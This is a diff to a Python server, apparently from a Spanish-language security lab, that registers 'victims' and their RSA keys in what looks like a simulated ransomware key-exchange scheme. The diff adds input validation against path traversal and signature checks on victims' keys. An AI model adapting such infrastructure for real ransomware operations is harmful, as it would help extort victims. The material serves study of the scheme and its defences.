@@ -13,6 +13,7 @@ import json
 import base64
 import socket
 import os
+import re
 import tempfile
 
 from pathlib import Path
@@ -30,7 +31,11 @@ from comun.crypto_common import (
 
 from Crypto.PublicKey import RSA
 
-from comun.firmas import firmar_clave
+from comun.firmas import (
+    firmar_clave,
+    verificar_firma_clave,
+    cargar_clave_publica_pem,
+)
 
 
 HOST = "0.0.0.0"
@@ -42,6 +47,13 @@ RUTA_REGISTRO = CARPETA_DATOS / "registro.json"
 
 RUTA_CLAVE_FIRMA_PRIVADA = CARPETA_DATOS / "clave_firma_privada.pem"
 RUTA_CLAVE_FIRMA_PUBLICA = CARPETA_DATOS / "clave_firma_publica.pem"
+
+# Claves de verificación de cada víctima, recibidas por un canal de
+# confianza independiente ANTES del registro: confianza_victimas/<idV>.pem
+CARPETA_CONFIANZA = CARPETA_DATOS / "confianza_victimas"
+
+# El idV se usa como nombre de archivo: solo caracteres seguros.
+PATRON_ID = re.compile(r"^[A-Za-z0-9._-]{1,64}$")
 
 # Protege el registro cuando varias conexiones se atienden simultáneamente.
 bloqueo_registro = Lock()
@@ -193,6 +205,44 @@ def campo_texto(mensaje, nombre, maximo=256):
     return valor
 
 
+def validar_id(id_victima):
+    """Restringe idV a caracteres seguros (se usa como nombre de archivo)."""
+    if not PATRON_ID.match(id_victima) or id_victima in {".", ".."}:
+        raise ValueError("idV inválido: use letras, dígitos, '.', '_' o '-'.")
+    return id_victima
+
+
+def autenticar_clave_victima(id_victima, clave_victima, firma_b64):
+    """Verifica que pkV esté firmada por la clave de firma de esa víctima.
+
+    La clave de verificación se toma de confianza_victimas/<idV>.pem, copiada
+    al servidor antes del intercambio. Nunca se usa una clave que llegue en
+    el propio mensaje de registro. Lanza ValueError si algo falla.
+    """
+    ruta = CARPETA_CONFIANZA / f"{id_victima}.pem"
+
+    if not ruta.exists():
+        raise ValueError(
+            "No hay clave de verificación de confianza para esta víctima."
+        )
+
+    try:
+        clave_confianza = cargar_clave_publica_pem(ruta)
+    except (ValueError, TypeError, IndexError) as error:
+        raise ValueError("La clave de confianza de la víctima no es válida.") from error
+
+    if not verificar_firma_clave(
+        clave_confianza,
+        "victima",
+        id_victima,
+        clave_victima,
+        firma_b64,
+    ):
+        raise ValueError(
+            "Firma de pkV ausente o inválida: se rechaza el registro."
+        )
+
+
 def validar_clave_publica(n, e):
     """Valida los parámetros públicos RSA recibidos."""
     try:
@@ -212,12 +262,19 @@ def validar_clave_publica(n, e):
 def manejar_registro(conexion, mensaje, registro, pk_servidor_exportada, clave_privada_firma):
     """Registra una víctima y entrega la clave del servidor firmada."""
     try:
-        id_victima = campo_texto(mensaje, "idV")
+        id_victima = validar_id(campo_texto(mensaje, "idV"))
         clave_victima = validar_clave_publica(
             mensaje.get("pkv_n"),
             mensaje.get("pkv_e"),
         )
+        # Defensa (prueba 4): el servidor autentica pkV antes de registrarla.
+        autenticar_clave_victima(
+            id_victima,
+            clave_victima,
+            mensaje.get("pkv_firma"),
+        )
     except (ValueError, TypeError) as error:
+        print(f"Registro rechazado: {error}")
         enviar_mensaje(conexion, {
             "tipo": "error",
             "detalle": str(error),
@@ -259,7 +316,7 @@ def manejar_registro(conexion, mensaje, registro, pk_servidor_exportada, clave_p
                 })
                 return
 
-            print(f"Víctima registrada: {id_victima}")
+            print(f"Víctima registrada (firma de pkV verificada): {id_victima}")
 
     clave_servidor = validar_clave_publica(
         pk_servidor_exportada["n"],
@@ -508,6 +565,7 @@ def main():
     )
     pk_servidor_exportada = exportar_publica(clave_publica_servidor)
     registro = cargar_registro()
+    CARPETA_CONFIANZA.mkdir(parents=True, exist_ok=True)
 
     escucha = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     escucha.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
